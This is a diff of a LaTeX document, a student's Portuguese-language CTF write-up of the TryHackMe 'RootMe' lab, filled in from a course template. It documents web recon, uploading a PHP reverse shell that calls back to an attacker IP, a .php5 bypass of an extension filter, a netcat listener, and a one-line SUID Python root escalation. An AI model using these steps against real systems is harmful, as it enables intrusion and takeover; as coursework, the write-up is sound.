@@ -1,10 +1,10 @@
 %==============================================================================
-% Template de Write-Up de CTF
+% Write-Up de CTF - RootMe (TryHackMe)
 % Materia : CIC0087 - Topicos Avancados em Computadores - Turma 04 - 2026/2
 % Depto.  : Departamento de Ciencias da Computacao
 % Baseado na "Metodologia para Construcao de Write-Ups em CTF"
 %
-% Compilacao:  pdflatex template.tex   (rodar 2x para atualizar o Sumario)
+% Compilacao:  pdflatex main.tex   (rodar 2x para atualizar o Sumario)
 %==============================================================================
 \documentclass[12pt,a4paper]{article}
 
@@ -22,6 +22,7 @@
 
 %------------------------- Utilitarios ----------------------------------------
 \usepackage{graphicx}
+\graphicspath{{img/}{./img/}}
 \usepackage{xcolor}
 \usepackage{float}
 \usepackage[hidelinks]{hyperref}
@@ -41,12 +42,11 @@
 \onehalfspacing
 
 %============================= METADADOS =======================================
-% Preencha os campos abaixo para cada write-up.
-\newcommand{\desafioNome}{RootMe}          % ex.: "Máquina Codify"
-\newcommand{\plataforma}{TryHackMe}                % ex.: HackTheBox / TryHackMe / Hacking Club
-\newcommand{\dificuldade}{Fácil}              % ex.: Fácil / Médio / Difícil
-\newcommand{\dataResolucao}{19/08/2026}             % data de resolucao
-\newcommand{\autorNome}{Luís Eduardo Curi Serra}                   % autor do write-up
+\newcommand{\desafioNome}{RootMe}
+\newcommand{\plataforma}{TryHackMe}
+\newcommand{\dificuldade}{Fácil}
+\newcommand{\dataResolucao}{20/08/2026}
+\newcommand{\autorNome}{Luís Eduardo Curi Serra}
 
 % Dados academicos (fixos para a disciplina)
 \newcommand{\materia}{CIC0087 -- Tópicos Avançados em Computadores -- Turma 04 -- 2026/2}
@@ -57,7 +57,6 @@
 %===============================================================================
 
 %------------------------- Cabecalho e rodape ---------------------------------
-% Regra da metodologia: cabecalho/rodape com nome do desafio e autor + numeracao.
 \pagestyle{fancy}
 \fancyhf{}
 \lhead{\small\itshape \desafioNome}
@@ -68,7 +67,6 @@
 \renewcommand{\footrulewidth}{0.4pt}
 
 %------------------------- Estilo dos blocos de codigo ------------------------
-% Fonte monoespacada com fundo destacado (cinza claro).
 \definecolor{codebg}{gray}{0.95}
 \definecolor{codeframe}{gray}{0.75}
 \definecolor{cmt}{RGB}{100,120,100}
@@ -98,21 +96,15 @@
 }
 \lstset{style=shell}
 
-% Atalhos: comando de terminal e bloco de output
+% Atalho: comando de terminal em linha
 \newcommand{\cmd}[1]{\lstinline[style=shell]|#1|}
 
-% Ambiente para OUTPUT (fundo levemente diferente, sem numeracao de T}          linha)
+% Ambiente para OUTPUT (fundo levemente diferente, fonte menor)
 \lstdefinestyle{output}{
   style=shell,
   backgroundcolor=\color{gray!8},
   basicstyle=\ttfamily\footnotesize,
   keywordstyle=\ttfamily,
-}
-
-% Caixa de destaque para placeholders/observacoes de OPSEC
-\newtcolorbox{nota}{
-  colback=yellow!8, colframe=yellow!40!black,
-  boxrule=0.5pt, arc=2pt, left=6pt, right=6pt, top=4pt, bottom=4pt
 }
 
 %===============================================================================
@@ -163,126 +155,248 @@
 
 %============================= 2.3 VISAO GERAL ==================================
 \section{Visão Geral}
-% Paragrafo descrevendo o vetor principal de ataque, SEM spoiler detalhado.
-% Deve responder: o que e o desafio, qual a superficie de ataque explorada e
-% qual foi o caminho geral ate o objetivo.
-Descreva aqui, em um parágrafo, o vetor principal de ataque sem detalhar o
-passo a passo. Explique \textbf{o que é} o desafio, qual a \textbf{superfície de
-ataque} explorada e qual foi o \textbf{caminho geral} percorrido até a flag.
+\textbf{RootMe} é uma máquina Linux de dificuldade \emph{fácil} que expõe um
+servidor web Apache. A superfície de ataque explorada é a aplicação web:
+um painel de \emph{upload} sem qualquer validação de tipo/extensão de arquivo
+permite subir uma \emph{webshell} PHP, que é servida a partir de um diretório
+público e executada, concedendo execução remota de código como o usuário
+\texttt{www-data}. A partir desse \emph{foothold}, a enumeração local revela um
+interpretador Python com bit \emph{SUID} habilitado, o que é abusado para
+obter um \emph{shell} como \texttt{root}. O caminho geral foi:
+reconhecimento (Nmap + Gobuster) $\rightarrow$ \emph{upload} de \emph{reverse
+shell} $\rightarrow$ acesso como \texttt{www-data} $\rightarrow$ escalada via
+binário SUID $\rightarrow$ \texttt{root}.
 
 %============================= 2.4 RECONHECIMENTO ===============================
 \section{Reconhecimento}
-% Resultado da enumeracao EXTERNA: portas abertas, servicos, versoes,
-% tecnologias. Incluir comandos usados e trechos de output relevantes.
-% Nao incluir informacoes obtidas apos o foothold inicial.
-Enumeração externa do alvo: portas abertas, serviços, versões e tecnologias
-identificadas. Cada comando deve estar acompanhado do porquê foi executado.
 
 \subsection{Varredura de portas}
-\begin{lstlisting}[language=bash,caption={Varredura inicial de portas e serviços com Nmap.}]
-nmap -sC -sV -p- --min-rate 5000 -oN nmap/initial <TARGET_IP>
+A varredura inicial identifica quais serviços estão expostos e suas versões,
+orientando as fases seguintes.
+
+\begin{lstlisting}[language=bash,caption={Varredura de portas e serviços com Nmap.}]
+nmap -T4 <TARGET_IP>
 \end{lstlisting}
 
-Trecho relevante do output (truncado):
-\begin{lstlisting}[style=output,caption={Serviços expostos identificados na varredura.}]
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH ...
-80/tcp open  http    ...
+Apenas duas portas abertas: \textbf{22/tcp (SSH)} e \textbf{80/tcp (HTTP)}.
+Sem credenciais, o SSH não é um vetor imediato, de modo que o foco recai sobre
+o serviço web.
+
+\begin{lstlisting}[style=output,caption={Portas abertas retornadas pela varredura.}]
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
 \end{lstlisting}
 
-\subsection{Enumeração de serviços}
-Descreva a enumeração dirigida aos serviços encontrados (web, SMB, DNS, etc.)
-e os achados que motivaram a fase de exploração.
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{1-nmap.png}
+  \caption{Nmap contra o alvo: portas 22 (SSH) e 80 (HTTP) abertas.}
+  \label{fig:nmap}
+\end{figure}
+
+\subsection{Enumeração do serviço web}
+A navegação pela aplicação e a listagem de diretórios (habilitada no servidor)
+revelam a versão exata do servidor: \textbf{Apache/2.4.41 (Ubuntu)}. A
+listagem de diretórios ativa já é, em si, uma má configuração que facilita a
+enumeração.
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.8\linewidth]{3-apache.png}
+  \caption{\emph{Directory listing} habilitado expondo a versão do servidor
+  (Apache/2.4.41 -- Ubuntu) no rodapé.}
+  \label{fig:apache}
+\end{figure}
+
+Para mapear diretórios não referenciados, foi executado o Gobuster com a
+\emph{wordlist} \texttt{common.txt}. O objetivo é descobrir pontos de entrada
+ocultos (áreas administrativas, diretórios de \emph{upload}, etc.).
+
+\begin{lstlisting}[language=bash,caption={Enumeração de diretórios com Gobuster.}]
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
+\end{lstlisting}
+
+Os achados relevantes são o diretório oculto \texttt{/panel} (formulário de
+\emph{upload}) e \texttt{/uploads} (onde os arquivos enviados ficam
+acessíveis publicamente) --- a combinação exata necessária para explorar
+\emph{upload} irrestrito.
+
+\begin{lstlisting}[style=output,caption={Diretórios encontrados (trecho relevante).}]
+css            (Status: 301)
+index.php      (Status: 200)
+js             (Status: 301)
+panel          (Status: 301)   <-- formulario de upload
+uploads        (Status: 301)   <-- arquivos enviados (publico)
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{2-gobuster.png}
+  \caption{Gobuster revelando os diretórios \texttt{/panel} e \texttt{/uploads}.}
+  \label{fig:gobuster}
+\end{figure}
 
 %============================= 2.5 EXPLORACAO ===================================
 \section{Exploração}
-% Descricao tecnica do vetor de entrada. Incluir o raciocinio que levou a
-% identificacao da vulnerabilidade, payloads/scripts (comentados), exploits
-% publicos e os outputs que confirmam o acesso. Cada passo JUSTIFICADO.
-Vetor de entrada e obtenção do \emph{foothold} inicial. Explique o raciocínio
-que levou à identificação da vulnerabilidade, e não apenas os comandos.
 
 \subsection{Identificação da vulnerabilidade}
-Justifique como a vulnerabilidade foi descoberta a partir dos achados do
-reconhecimento.
+O diretório \texttt{/panel} apresenta um formulário ``\emph{Select a file to
+upload}''. Testes de envio mostram que a aplicação \textbf{não valida a
+extensão nem o tipo (MIME) do arquivo} e armazena o resultado em
+\texttt{/uploads}, que é servido diretamente pelo Apache. Como o servidor
+interpreta arquivos PHP (inclusive a extensão alternativa \texttt{.php5}),
+é possível enviar uma \emph{webshell} e obter execução remota de código
+(\emph{unrestricted file upload $\rightarrow$ RCE}).
 
 \subsection{Payload / Exploit}
-\begin{lstlisting}[language=bash,caption={Payload utilizado para explorar a falha (comentado).}]
-# Objetivo: <o que este payload faz>
-# Motivo:  <por que ele funciona contra o alvo>
-curl -s "http://<TARGET_IP>/..." --data "<PAYLOAD>"
+Foi utilizada a \emph{reverse shell} em PHP do \emph{pentestmonkey}, ajustando
+o IP do atacante (obtido via \cmd{ifconfig}, interface \texttt{tun0}) e a porta
+de escuta. O arquivo foi renomeado para \texttt{.php5} a fim de contornar um
+eventual filtro sobre a extensão \texttt{.php}, mantendo a execução como PHP.
+
+\begin{lstlisting}[language=bash,caption={Preparação do payload (comentado).}]
+# Objetivo: obter uma reverse shell PHP no alvo.
+# 1) Editar php-reverse-shell.php: $ip = <ATTACKER_IP>; $port = 1234;
+# 2) Renomear para .php5 (executado como PHP e contorna filtro de extensao):
+mv php-reverse-shell.php php-reverse-shell.php5
+# 3) Enviar o arquivo pelo formulario em http://<TARGET_IP>/panel/
 \end{lstlisting}
+
+O envio pelo painel retorna a confirmação ``O arquivo foi upado com sucesso!'',
+e o arquivo passa a estar disponível em \texttt{/uploads}.
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.7\linewidth]{6-upload-reverse-shell.png}
+  \caption{\emph{Upload} da \emph{webshell} PHP aceito pelo painel \texttt{/panel}.}
+  \label{fig:upload}
+\end{figure}
 
 \subsection{Confirmação de acesso}
-\begin{lstlisting}[style=output,caption={Output que confirma a execução de comandos / shell obtido.}]
-id
-uid=1000(user) gid=1000(user) groups=1000(user)
+Com um \emph{listener} Netcat ativo, basta acessar a \emph{webshell} em
+\texttt{/uploads} para disparar a conexão reversa. O comando abaixo coloca a
+máquina atacante à escuta na porta escolhida.
+
+\begin{lstlisting}[language=bash,caption={Listener e disparo da reverse shell.}]
+nc -l -v -n -p 1234
+# Em seguida, abrir no navegador:
+#   http://<TARGET_IP>/uploads/php-reverse-shell.php5
 \end{lstlisting}
 
-%======================== 2.6 MOVIMENTACAO LATERAL =============================
-\section{Movimentação Lateral}
-% (Se aplicavel) Aplicavel quando ha multiplos usuarios ou pivoting entre
-% servicos. Mesmo padrao da secao anterior. Caso nao se aplique, remova a secao.
-\textit{Aplicável quando há múltiplos usuários ou \emph{pivoting} entre
-serviços. Caso não se aplique a este desafio, remova esta seção.}
+A conexão é recebida e obtém-se um \emph{shell} como \texttt{www-data}
+(\texttt{uid=33}), confirmando a execução remota de código.
 
-\subsection{Enumeração pós-foothold}
-Descreva os credenciais/arquivos/serviços internos encontrados que permitiram
-mudar de contexto de usuário.
-
-\begin{lstlisting}[language=bash,caption={Coleta de credenciais reutilizáveis.}]
-cat /home/user/config.php   # senha em texto claro -> <PASSWORD>
-su outro_usuario            # reutilizacao de credencial
+\begin{lstlisting}[style=output,caption={Shell recebido: contexto www-data.}]
+connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>]
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 \end{lstlisting}
 
-%======================== 2.7 ESCALADA DE PRIVILEGIOS ==========================
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{9-netcat-to-reverse-shell.png}
+  \caption{Netcat recebendo a \emph{reverse shell} como \texttt{www-data}.}
+  \label{fig:netcat}
+\end{figure}
+
+A \emph{flag} de usuário é então lida em \texttt{/var/www/user.txt}.
+
+\begin{lstlisting}[language=bash,caption={Leitura da flag de usuário.}]
+cd /var/www
+cat user.txt        # -> <FLAG>
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{10-user-flag.png}
+  \caption{Enumeração de \texttt{/var/www} e obtenção da \emph{flag} de usuário.}
+  \label{fig:userflag}
+\end{figure}
+
+%======================== 2.6 ESCALADA DE PRIVILEGIOS ==========================
 \section{Escalada de Privilégios}
-% Vetor de privesc, o processo de enumeracao local que o revelou
-% (linpeas, sudo -l, capabilities, ...) e a exploracao. Incluir o comando
-% final que comprova o acesso root/SYSTEM.
-Vetor de \emph{privilege escalation}, a enumeração local que o revelou e a
-exploração realizada.
 
 \subsection{Enumeração local}
-\begin{lstlisting}[language=bash,caption={Enumeração de vetores de privesc.}]
-sudo -l
-getcap -r / 2>/dev/null
-./linpeas.sh
+Como \texttt{www-data}, procuram-se binários com o bit \emph{SUID} (permissão
+\texttt{4000}), que executam com os privilégios do dono do arquivo. Se algum
+interpretador ou binário perigoso estiver marcado como SUID de \texttt{root},
+ele pode ser abusado para elevar privilégios.
+
+\begin{lstlisting}[language=bash,caption={Busca por binários SUID (erros descartados).}]
+find / -perm -4000 -type f 2>/dev/null
 \end{lstlisting}
+
+Entre binários SUID legítimos do sistema, destaca-se um anômalo:
+\texttt{/usr/bin/python2.7}. Um interpretador completo com SUID de
+\texttt{root} é o vetor de escalada.
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.5\linewidth]{11-suid.png}
+  \caption{\texttt{/usr/bin/python2.7} listado entre os binários com bit SUID.}
+  \label{fig:suid}
+\end{figure}
 
 \subsection{Exploração e obtenção de root}
-Justifique o vetor identificado e a técnica aplicada.
+Conforme a técnica documentada no GTFOBins para Python com SUID, invoca-se o
+interpretador com a \emph{flag} \texttt{-p} de \texttt{/bin/sh}, que
+\textbf{preserva o EUID efetivo} (\texttt{root}) em vez de descartá-lo. Isso
+produz um \emph{shell} privilegiado.
 
-\begin{lstlisting}[style=output,caption={Comando final que comprova o acesso privilegiado.}]
-# id
-uid=0(root) gid=0(root) groups=0(root)
+\begin{lstlisting}[language=bash,caption={Abuso do Python SUID para virar root.}]
+/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 \end{lstlisting}
 
-%============================= 2.8 CONCLUSAO ====================================
+O \cmd{whoami} retorna \texttt{root}, comprovando o comprometimento total.
+A \emph{flag} final é lida em \texttt{/root/root.txt}.
+
+\begin{lstlisting}[style=output,caption={Confirmação de acesso privilegiado.}]
+whoami
+root
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.9\linewidth]{12-privilage-escalation.png}
+  \caption{Execução do Python SUID resultando em \emph{shell} como \texttt{root}.}
+  \label{fig:privesc}
+\end{figure}
+
+\begin{lstlisting}[language=bash,caption={Leitura da flag de root.}]
+cd /root
+cat root.txt        # -> <FLAG>
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.9\linewidth]{13-root-flag.png}
+  \caption{Enumeração de \texttt{/root} e obtenção da \emph{flag} de \texttt{root}.}
+  \label{fig:rootflag}
+\end{figure}
+
+%============================= 2.7 CONCLUSAO ====================================
 \section{Conclusão}
-% Resumo tecnico de 3 a 5 linhas sintetizando a cadeia completa,
-% do reconhecimento a flag.
-Resumo técnico de 3 a 5 linhas sintetizando a cadeia de exploração completa,
-do reconhecimento até a flag: qual foi o vetor inicial, como se deu a
-movimentação/escalada e qual falha central permitiu comprometer o alvo.
+O comprometimento resultou do encadeamento de duas más configurações. Primeiro,
+o painel web em \texttt{/panel} permitia \emph{upload} irrestrito de arquivos:
+o envio de uma \emph{webshell} \texttt{.php5}, executável a partir do diretório
+público \texttt{/uploads}, concedeu execução remota de código como
+\texttt{www-data}. Em seguida, o binário \texttt{/usr/bin/python2.7} estava
+indevidamente marcado como \emph{SUID root}; abusá-lo via GTFOBins
+(\texttt{sh -p}) elevou o acesso a \texttt{root}. A falha central foi a
+ausência de validação de \emph{upload}, agravada por um interpretador com bit
+SUID desnecessário.
 
-%============================= 2.9 REFERENCIAS ==================================
+%============================= 2.8 REFERENCIAS ==================================
 \section{Referências}
-% Fontes utilizadas: links dos repositorios dos exploits publicos e links das
-% CVEs correspondentes.
+Este desafio decorre de más configurações (\emph{unrestricted file upload} e
+binário SUID), não de uma CVE específica.
 \begin{itemize}[leftmargin=1.5em]
-  \item CVE-XXXX-YYYY --- \url{https://nvd.nist.gov/vuln/detail/CVE-XXXX-YYYY}
-  \item Exploit público --- \url{https://github.com/<autor>/<repo>}
-  \item Documentação / referência técnica --- \url{https://...}
+  \item pentestmonkey --- \texttt{php-reverse-shell} ---
+        \url{https://github.com/pentestmonkey/php-reverse-shell}
+  \item GTFOBins --- Python (SUID) ---
+        \url{https://gtfobins.github.io/gtfobins/python/\#suid}
+  \item TryHackMe --- Sala \emph{RootMe} ---
+        \url{https://tryhackme.com/room/rrootme}
 \end{itemize}
-
-%------------------------- Lembrete de OPSEC (remover) ------------------------
-\begin{nota}
-\small\textbf{Antes de entregar, verifique:} substitua IPs, senhas, hashes e
-tokens por placeholders (\texttt{<TARGET\_IP>}, \texttt{<PASSWORD>},
-\texttt{<HASH>}); \textbf{não} exiba flags no corpo do documento
-(use \texttt{<FLAG>}); trunque outputs longos; toda imagem deve ter legenda; e
-todo comando deve vir acompanhado da justificativa. Remova esta caixa.
-\end{nota}
 
 \end{document}
